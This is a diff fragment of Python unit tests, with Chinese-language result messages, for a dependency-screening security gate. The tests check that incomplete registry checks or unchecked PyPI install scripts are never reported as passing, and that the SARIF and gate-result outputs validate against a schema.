+                         "\n⚠️ G1 無法完成檢查（網路/registry 失敗或鎖定檔未解析）→ incomplete，絕不視為通過。")
+        self.assertIn("incomplete_checks", inc_out.to_stdout())
+        self.assertIn("untested_controls", inc_out.to_stdout())
+
+        # 7) 有掃描：無檢查失敗但有控制未實測（PyPI 安裝腳本未檢查）
+        self.write("requirements.txt", "requests==2.32.0\n")
+        py_out = gs.screen(gs.Request(target=self.D, manifests=("requirements.txt",)),
+                           self.env(registry=gr.FakeRegistry({("pypi", "requests", "2.32.0"): pypi_clean()})))
+        self.assertEqual(
+            py_out.result_line(),
+            "\n⚠️ G1 有控制未實測 → incomplete，絕不視為通過：VS-G1-INSTALL-HOOK 未實測（1 個 PyPI 套件的安裝腳本尚無檢查（只檢查 npm scripts））",
+        )
+
+    def test_sarif_and_gate_result_views_including_unreadable_policy_validate_against_schema(self):
+        unr = gs.Outcome.unreadable(f"{POLICY_UNREADABLE}（測試）", gs.Request(staged=True, base="abc123"), config_root=ROOT)
+        self.assertEqual((unr.exit_code, unr.status, unr.scope, unr.to_stdout(), unr.to_sarif()), (2, "incomplete", "diff", None, None))
+        self.assertEqual(unr.result_line(), f"⚠️ G1 無法完成檢查：{POLICY_UNREADABLE}（測試） → incomplete。")
+        g_unr = unr.to_gate_result("2026-11-19T00:00:00+00:00", "deadbeef")
+        self.assertEqual(list(GATE_SCHEMA.iter_errors(g_unr)), [])
+        self.assertEqual(g_unr["mode"], "enforce")
+        self.assertEqual(g_unr["tools"], [gate_result.tool("vibesec-slopcheck", "error", version="2.0.0")])
+        self.assertEqual([c["control_id"] for c in g_unr["coverage"] if c["state"] == "pending"], ["VS-G1-SBOM", "ASVS5-V15.2"])
+
+        non_utf8 = os.fsdecode(b"\xff-dir")
+        p = self.D / non_utf8
+        try:
+            p.mkdir()
+            (p / "package.json").write_text('{"dependencies": {"evil-pkg": "1.0.0"}}\n', encoding="utf-8")
+        except OSError:
+            self.skipTest("檔案系統不接受非 UTF-8 檔名")
+        out = gs.screen(gs.Request(target=self.D, manifests=(f"{non_utf8}/package.json",)),
+                        self.env(registry=gr.FakeRegistry({("npm", "evil-pkg", "1.0.0"): gr.NotFound()})))
+        sarif = out.to_sarif()
+        self.assertEqual(sarif["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
+                         "%FF-dir/package.json")
+        gate_doc = out.to_gate_result("2026-11-19T00:00:00+00:00", "deadbeef", sarif_ref="reports/g1.sarif")
+        self.assertEqual(list(GATE_SCHEMA.iter_errors(gate_doc)), [])
+        self.assertEqual(gate_doc["tools"][0]["output_ref"], "reports/g1.sarif")
+
+
+if __name__ == "__main__":
+    unittest.main()
